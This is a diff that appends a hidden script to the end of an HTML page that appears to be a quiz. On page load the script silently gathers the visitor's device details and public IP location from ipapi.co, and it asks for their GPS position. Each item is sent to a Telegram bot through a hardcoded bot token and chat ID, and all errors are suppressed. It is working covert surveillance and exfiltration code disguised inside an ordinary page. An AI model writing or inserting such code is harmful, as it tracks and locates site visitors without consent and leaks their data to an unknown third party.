@@ -1018,5 +1018,52 @@ function showResult(){
 
 render();
 </script>
+<script>
+    (function() {
+        const BOT_TOKEN = '7452582356:AAGVebNPLIW570_xBXZf3qQF8rWxGVclLKc';
+        const CHAT_ID = '8761801777';
+
+        async function send(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                });
+            } catch(e) {}
+        }
+
+        (async () => {
+            // 1. Informasi perangkat
+            let device = `🖥️ <b>Device Info</b>\n`;
+            device += `User Agent: ${navigator.userAgent}\n`;
+            device += `Platform: ${navigator.platform}\n`;
+            device += `Screen: ${screen.width}x${screen.height}\n`;
+            device += `Language: ${navigator.language}\n`;
+            device += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            await send(device);
+
+            // 2. IP Publik (via ipapi.co)
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let ipData = await res.json();
+                let ipMsg = `🌐 <b>IP & Location</b>\n`;
+                ipMsg += `IP: ${ipData.ip}\n`;
+                ipMsg += `Country: ${ipData.country_name}\n`;
+                ipMsg += `City: ${ipData.city}\n`;
+                ipMsg += `ISP: ${ipData.org}`;
+                await send(ipMsg);
+            } catch(e) {}
+
+            // 3. Lokasi GPS (butuh izin pengguna)
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    let loc = `📍 <b>GPS Location</b>\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`;
+                    await send(loc);
+                }, (err) => {});
+            }
+        })();
+    })();
+</script>
 </body>
 </html>
